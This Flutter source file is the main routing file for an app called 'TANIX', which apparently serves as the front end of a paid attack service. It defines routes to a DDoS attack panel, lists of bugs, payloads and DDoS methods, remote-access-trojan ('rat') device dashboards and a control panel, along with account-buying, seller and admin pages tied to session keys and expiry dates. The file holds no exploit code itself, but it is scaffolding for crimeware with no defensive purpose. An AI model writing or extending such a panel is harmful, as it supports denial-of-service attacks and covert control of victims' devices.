import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart'; // Re-import jika ingin cek sesi di masa depan

// Import Halaman Utama
import 'landing_page.dart'; 
import 'login_page.dart';
import 'loader_page.dart';
import 'home_page.dart';
import 'seller_page.dart';
import 'admin_page.dart';
import 'buy_account.dart';
import 'splash.dart'; 
import 'device_dashboard.dart';
import 'control_panel.dart';
import 'ddos_panel.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  
  // MODIFIKASI: Mengembalikan rute awal ke '/' (Landing Page)
  // Anda juga bisa mengubahnya ke '/login' jika ingin langsung ke form login.
  String initialRoute = '/'; 

  runApp(MyApp(startRoute: initialRoute));
}

class MyApp extends StatelessWidget {
  final String startRoute;
  const MyApp({super.key, required this.startRoute});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'TANIX',
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'ShareTechMono', 
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark().copyWith(
          primary: Colors.redAccent,
          secondary: Colors.purple,
        ),
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.black,
          elevation: 0,
          centerTitle: true,
        ),
      ),
      initialRoute: startRoute, 
      
      onGenerateRoute: (settings) {
        // Mengambil argumen dari Navigator.pushNamed
        final args = settings.arguments as Map<String, dynamic>?;

        switch (settings.name) {
          case '/':
            return MaterialPageRoute(builder: (_) => const LandingPage());

          case '/login':
            return MaterialPageRoute(builder: (_) => const LoginPage());

          case '/splash':
            return MaterialPageRoute(
              builder: (_) => SplashPage(data: args ?? {}),
            );

          case '/buy_account':
            return MaterialPageRoute(builder: (_) => const BuyAccountPage());

          case '/loader':
            return MaterialPageRoute(
              builder: (_) => DashboardPage(
                username: args?['username'] ?? '',
                password: args?['password'] ?? '',
                role: args?['role'] ?? 'member',
                sessionKey: args?['key'] ?? '',
                expiredDate: args?['expiredDate'] ?? '',
                listBug: List<Map<String, dynamic>>.from(args?['listBug'] ?? []),
                listPayload: List<Map<String, dynamic>>.from(args?['listPayload'] ?? []),
                listDDoS: List<Map<String, dynamic>>.from(args?['listDDoS'] ?? []),
                news: List<Map<String, dynamic>>.from(args?['news'] ?? []),
              ),
            );

          case '/attack':
            return MaterialPageRoute(
              builder: (_) => AttackPanel(
                sessionKey: args?['sessionKey'] ?? '',
                listDDoS: List<Map<String, dynamic>>.from(args?['listDDoS'] ?? []),
              ),
            );

          case '/seller':
            return MaterialPageRoute(
              builder: (_) => SellerPage(keyToken: args?['keyToken'] ?? ''),
            );

          case '/admin':
            return MaterialPageRoute(
              builder: (_) => AdminPage(sessionKey: args?['sessionKey'] ?? ''),
            );

          case '/login_rat':
            // Sekarang halaman ini tidak lagi otomatis redirect, 
            // melainkan menunggu input user (asumsi ada file login_rat_page.dart)
            return MaterialPageRoute(builder: (_) => const DeviceDashboardPage());

          case '/dashboard_rat':
            return MaterialPageRoute(builder: (_) => const DeviceDashboardPage());

          case '/control_panel':
            return MaterialPageRoute(
              settings: settings,
              builder: (_) => const ControlCenterPage(),
            );

          default:
            return MaterialPageRoute(
              builder: (_) => const Scaffold(
                body: Center(child: Text("404 - PANEL NOT FOUND", style: TextStyle(color: Colors.red))),
              ),
            );
        }
      },
    );
  }
}